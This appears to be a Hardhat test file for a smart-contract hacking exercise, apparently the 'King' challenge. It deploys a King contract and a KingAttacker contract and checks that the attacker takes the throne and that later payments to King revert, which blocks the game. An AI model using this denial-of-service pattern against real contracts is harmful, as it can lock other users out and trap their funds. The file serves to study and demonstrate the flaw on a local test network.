import { ethers } from "hardhat";
import { expect } from "chai";

describe("Attack", () => {
  it("Should work", async () => {
    const [owner, attacker] = await ethers.getSigners();
    const King = await ethers.getContractFactory("King");
    const king = await King.deploy({ value: ethers.utils.parseEther("0.001") });

    const KingAttacker = await ethers.getContractFactory("KingAttacker");
    const kingAttacker = await KingAttacker.deploy(king.address);

    expect(await king._king()).to.eq(owner.address);
    await attacker.sendTransaction({ to: kingAttacker.address, value: ethers.utils.parseEther("0.001") });
    expect(await king._king()).to.eq(kingAttacker.address);

    await expect(owner.sendTransaction({ to: king.address, value: ethers.utils.parseEther("0.001") })).to.be.reverted;
  })
})
